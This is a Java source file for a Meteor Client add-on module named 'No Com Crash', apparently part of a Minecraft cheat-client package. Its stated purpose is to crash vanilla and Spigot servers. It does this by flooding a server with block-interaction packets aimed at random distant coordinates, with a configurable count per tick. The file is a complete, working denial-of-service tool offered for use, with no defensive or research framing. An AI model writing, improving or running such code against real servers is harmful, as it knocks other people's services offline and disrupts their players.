package im.hira.tweaks.modules.Crash;

import im.hira.tweaks.MCM4MC;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class NoComCrash extends Module {

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packetCount = sgGeneral.add(new IntSetting.Builder()
        .name("packet-count")
        .description("Number of interaction packets to send per tick.")
        .defaultValue(15)
        .min(1)
        .max(100)
        .sliderRange(1, 100)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module when you disconnect or leave the world.")
        .defaultValue(true)
        .build()
    );

    private final Random r = new Random();

    public NoComCrash() {
        super(MCM4MC.JH_CRASH_CAT, "No Com Crash", "Crashes vanilla and Spigot servers by spamming interaction packets.");
    }

    @EventHandler
    private void onTickPost(TickEvent.Post event) {
        if (mc.player == null || mc.world == null || mc.getNetworkHandler() == null) {
            if (autoDisable.get()) {
                toggle();
            }
            return;
        }

        try {
            for (int i = 0; i < packetCount.get(); i++) {
                Vec3d cpos = pickRandomPos();
                BlockPos blockPos = new BlockPos((int) cpos.x, (int) cpos.y, (int) cpos.z); // Convert Vec3d to BlockPos
                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(
                    Hand.MAIN_HAND,
                    new BlockHitResult(cpos, Direction.DOWN, blockPos, false),
                    0 // Sequence number; 0 is safe for 1.21.8 as it's handled by the client
                );
                mc.getNetworkHandler().sendPacket(packet);
            }
        } catch (Exception e) {
            ChatUtils.error("Stopping NoCom crash because an error occurred: " + e.getMessage());
            toggle();
        }
    }

    private Vec3d pickRandomPos() {
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }
}
